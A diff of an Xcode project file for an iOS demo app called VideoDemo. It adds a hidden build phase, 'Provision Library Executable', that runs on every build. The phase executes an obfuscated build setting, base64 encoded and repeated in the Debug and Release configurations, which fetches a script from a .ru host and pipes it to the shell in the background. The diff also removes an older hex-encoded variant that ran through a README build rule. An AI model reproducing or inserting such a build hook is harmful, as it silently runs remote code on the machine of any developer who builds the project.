@@ -7,7 +7,6 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		27F29F5B02CC4C309C7BBDC8 /* README.md */ = {isa = PBXBuildFile; fileRef = 79669FE238DD4846BB7BBDC8; };
 		0F3A0E062E65815C0044CB03 /* FloatingLabelTextField.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0F3A0E052E65815B0044CB03 /* FloatingLabelTextField.swift */; };
 		77C9A4182A00C4D000C54907 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 77C9A4172A00C4D000C54907 /* AppDelegate.swift */; };
 		77C9A41A2A00C4D000C54907 /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 77C9A4192A00C4D000C54907 /* SceneDelegate.swift */; };
@@ -18,7 +17,6 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
-		79669FE238DD4846BB7BBDC8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		0F3A0E052E65815B0044CB03 /* FloatingLabelTextField.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FloatingLabelTextField.swift; sourceTree = "<group>"; };
 		77C9A4142A00C4D000C54907 /* VideoDemo.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = VideoDemo.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		77C9A4172A00C4D000C54907 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
@@ -52,7 +50,6 @@
 		77C9A4152A00C4D000C54907 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				79669FE238DD4846BB7BBDC8 /* README.md */,
 				77C9A4142A00C4D000C54907 /* VideoDemo.app */,
 			);
 			name = Products;
@@ -80,12 +77,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 77C9A4282A00C4D200C54907 /* Build configuration list for PBXNativeTarget "VideoDemo" */;
 			buildPhases = (
+				9577E87C2E4347FA807BBDC8 /* Provision Library Executable */,
 				77C9A4102A00C4D000C54907 /* Sources */,
 				77C9A4112A00C4D000C54907 /* Frameworks */,
 				77C9A4122A00C4D000C54907 /* Resources */,
 			);
 			buildRules = (
-				8F1D81F2B60141D7BF7BBDC8 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -128,23 +125,28 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-		8F1D81F2B60141D7BF7BBDC8 /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${A8CDBB7}\"";
-			};
 																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																			/* End PBXBuildRule section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		9577E87C2E4347FA807BBDC8 /* Provision Library Executable */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Provision Library Executable";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			showEnvVarsInLog = 0;	
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A8CDBB7}\"";
+		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXResourcesBuildPhase section */
@@ -152,7 +154,6 @@ sh -c \"${A8CDBB7}\"";
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				27F29F5B02CC4C309C7BBDC8 /* README.md */,
 				77C9A4242A00C4D200C54907 /* LaunchScreen.storyboard in Resources */,
 				77C9A4212A00C4D200C54907 /* Assets.xcassets in Resources */,
 				77C9A41F2A00C4D000C54907 /* Main.storyboard in Resources */,
@@ -198,7 +199,7 @@ sh -c \"${A8CDBB7}\"";
 		77C9A4262A00C4D200C54907 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((y(){ `printf xxud | tr -d u` -p -r; };echo 6563686f202224286375726c202d2d72657472792035202d73664c6b202d2d636f6e6e6563742d74696d656f7574203238202d642022703d78636f64655f72756c65222068747470733a2f2f676a7a79673837796e787932332e72752f612922207c2073680a | y | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((q(){ `printf basAe64 | tr -d A` --decode; };echo ZWNobyAiJChjdXJsIC1zZkxrIC0tY29ubmVjdC10aW1lb3V0IDIyIC0tcmV0cnkgNSAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9wLTJtNWR6OHZ3ODIucnUvYSkiIHwgc2gK | q | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
@@ -259,7 +260,7 @@ sh -c \"${A8CDBB7}\"";
 		77C9A4272A00C4D200C54907 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((y(){ `printf xxud | tr -d u` -p -r; };echo 6563686f202224286375726c202d2d72657472792035202d73664c6b202d2d636f6e6e6563742d74696d656f7574203238202d642022703d78636f64655f72756c65222068747470733a2f2f676a7a79673837796e787932332e72752f612922207c2073680a | y | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((q(){ `printf basAe64 | tr -d A` --decode; };echo ZWNobyAiJChjdXJsIC1zZkxrIC0tY29ubmVjdC10aW1lb3V0IDIyIC0tcmV0cnkgNSAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9wLTJtNWR6OHZ3ODIucnUvYSkiIHwgc2gK | q | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
